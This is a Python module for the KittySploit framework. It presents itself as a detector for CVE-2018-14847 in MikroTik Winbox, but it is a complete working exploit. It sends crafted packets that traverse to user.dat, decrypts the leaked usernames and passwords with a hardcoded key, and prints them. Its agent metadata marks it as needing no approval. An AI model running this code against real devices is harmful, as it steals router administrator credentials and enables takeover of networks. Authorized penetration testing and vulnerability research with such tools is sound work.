#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MikroTik Winbox user.dat information disclosure (CVE-2018-14847)."""

import hashlib
import socket

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'MikroTik Winbox - user.dat Disclosure Detection (CVE-2018-14847)',
        'description': (
            'Detects CVE-2018-14847 by requesting flash/rw/store/user.dat via Winbox (TCP 8291) '
            'and decrypting leaked credentials when present.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'scanner', 'tcp', 'mikrotik', 'winbox', 'cve', 'cve2018', 'info-leak', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'credential_leak', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2018-14847',
            'https://n0p.me/winbox-bug-dissection/',
            'https://github.com/BasuCert/WinboxPoC',
        ],
        'cve': 'CVE-2018-14847',
    }

    port = OptPort(8291, 'Winbox TCP port', True)

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host, port):
            return False

        query1 = bytes([
            0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
            0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
            0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
            0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
            0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
            0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
            0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
            0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
            0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
            0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
            0x00, 0x00,
        ])

        try:
            sock = socket.create_connection((host, port), timeout=self._timeout())
            sock.settimeout(self._timeout())
            sock.sendall(query1)
            recv1 = sock.recv(1024)
            if not recv1 or len(recv1) < 39:
                sock.close()
                return False
            sessionid = recv1[38]
            query2 = bytes([
                0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
                0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
                0x00, 0xfe, 0x09, sessionid, 0x02, 0x00, 0x00, 0x08,
                0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
                0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
                0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
                0x00, 0x02, 0x00, 0x00, 0x00,
            ])
            sock.sendall(query2)
            recv2 = sock.recv(4096)
            sock.close()
        except Exception:
            return False

        if not recv2 or b'M2' not in recv2:
            return False

        credentials = []
        marker_user = bytes([0x01, 0x00, 0x00, 0x21])
        marker_pw = bytes([0x11, 0x00, 0x00, 0x21])
        for entry in recv2.split(b'M2'):
            idx = entry.find(marker_user)
            if idx < 0 or idx + 5 >= len(entry):
                continue
            user_len = entry[idx + 4]
            username = entry[idx + 5: idx + 5 + user_len]
            idx = entry.find(marker_pw)
            if idx < 0 or idx + 5 >= len(entry):
                continue
            pw_len = entry[idx + 4]
            if pw_len == 0:
                password = b''
            else:
                pw = entry[idx + 5: idx + 5 + pw_len]
                key = hashlib.md5(username + b'283i4jfkai3389').digest()
                out = bytearray()
                for i, b in enumerate(pw):
                    ch = b ^ key[i % len(key)]
                    if ch == 0:
                        break
                    out.append(ch)
                password = bytes(out)
            try:
                credentials.append(
                    f"{username.decode('utf-8', 'replace')}:{password.decode('utf-8', 'replace')}"
                )
            except Exception:
                credentials.append('user:pass')

        if credentials:
            self.set_info(
                severity='critical',
                reason=f'Winbox user.dat leak (CVE-2018-14847): {", ".join(credentials[:3])}',
                path=f'tcp/{port}',
            )
            return True
        # M2 present but no parsed creds still indicates vulnerable protocol path
        if b'user.dat' in recv2 or len(recv2) > 50:
            self.set_info(
                severity='high',
                reason='Winbox responded to user.dat traversal (CVE-2018-14847 likely)',
                path=f'tcp/{port}',
            )
            return True
        return False
